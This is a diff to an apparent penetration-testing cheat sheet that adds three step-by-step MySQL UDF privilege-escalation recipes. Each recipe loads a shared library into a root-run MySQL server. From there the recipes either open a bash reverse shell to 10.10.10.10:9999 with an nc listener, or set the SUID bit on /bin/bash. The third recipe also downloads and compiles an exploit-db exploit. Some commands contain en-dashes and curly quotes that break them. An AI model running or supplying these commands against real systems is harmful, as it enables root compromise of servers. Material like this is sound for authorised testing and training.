@@ -947,7 +947,9 @@ User Defined Function (UDF) is a piece of code that extends the functionality of
 UDFs are useful when you need to extend the functionality of your MySQL server
 For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution
 
-Example 
+Example 1 - Reverse Shell 
+
+Victim
 ```
 ps aux | grep root                        //  Verify that MySQL is running as root
 Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
@@ -961,20 +963,66 @@ mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
 mysql> select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so';
 mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
 mysql> select sys_exec('bash -i >& /dev/tcp/10.10.10.10/9999 0>&1');
-mysql> create table foo(line blob);
-mysql> insert into foo values(load_file(‘/home/raptor/raptor_udf.so’));
-mysql> select * from foo into dumpfile ‘/usr/lib/raptor_udf.so’;
-mysql> create function do_system returns integer soname ‘raptor_udf.so’;
-mysql> select * from mysql.func;
-mysql> select do_system(‘chmod +s /bin/bash’);
-mysql> !bash
-ls -la /bin/bash                          // Verify that the SUID bit is set
+
+// Any UDF library can be used , as long as it is exploitable via the sys_exec() function
+// The "admin" table name can be named anything
+// Ensure that the path to the UDF (.so) is correct
+// Replace IP & Port
+```
+Attacker
+```
+nc -lvnp 9999
+```
+
+Example 2 (Local via SUID)
+
+Victim
+```
+ps aux | grep root                        //  Verify that MySQL is running as root
+Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
+Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
+Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
+mysql -u root -p
+
+mysql> use mysql;
+mysql> create table admin(line blob);
+mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
+mysql> select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so';
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('chmod +s /bin/bash');
+mysql> exit
+Wait a while
+ls -la /bin/bash                         // Verify that the SUID bit is set 
 /bin/bash -p
 id && whoami
-
-// Replace raptor_udf.c 
-// Replace foo with any other table name
-// Ensure that the path to the UDF is correct
-// Ensure to select the correct database / table name
-// Review the vulnerable code before you compile it to ensure there is no malicious code
 ```
+Example 3 (Explioting MySQL 4.x/5.0 (Linux))
+
+UDF Link: https://www.exploit-db.com/exploits/1518
+
+Victim
+```
+wget -O priv.c https://www.exploit-db.com/download/1518
+gcc –g –shared –Wl,–soname,priv.so –o priv.so priv.c –lc
+chmod 777 priv.so
+mv priv.so /tmp/
+mysql -u root -p 
+
+mysql> create table priv(line blob);
+mysql> insert into priv values(load_file(‘/tmp/priv.so’));
+mysql> select * from priv into dumpfile ‘/usr/lib/mysql/plugin/priv.so’;
+mysql> create function do_system returns integer soname ‘priv.so’;
+mysql> select do_system(‘bash -i >& /dev/tcp/10.10.10.10/9999 0>&1’);
+
+// priv.c can be called anything
+// The "priv" table name can be named anything
+// Ensure that the path to the UDF (.so) is correct
+// Replace IP & Port
+```
+Attacker
+```
+nc -lvnp 9999
+```
+
+
+
